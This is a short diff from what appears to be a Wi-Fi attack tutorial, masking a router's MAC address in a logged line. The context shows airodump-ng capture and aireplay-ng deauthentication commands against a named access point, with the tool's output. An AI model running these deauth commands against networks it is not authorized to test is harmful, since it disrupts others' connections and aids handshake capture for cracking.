@@ -105,7 +105,7 @@ sudo airodump-ng --bssid  F6:xx:xx:xx:xx:4F -c <channel number> -w capture  wlan
 sudo aireplay-ng --deauth 5 -a F6:xx:xx:xx:xx:4F wlan0mon
 
 [sudo] password for balu: 
-12:07:02  Waiting for beacon frame (BSSID: F6:4E:E3:90:9D:4F) on channel 6
+12:07:02  Waiting for beacon frame (BSSID: F6:xx:xx:xx:xx:4F) on channel 6
 NB: this attack is more effective when targeting
 a connected wireless client (-c <client's mac>).
 12:07:02  Sending DeAuth (code 7) to broadcast -- BSSID: [F6:xx:xx:xx:xx:4F]
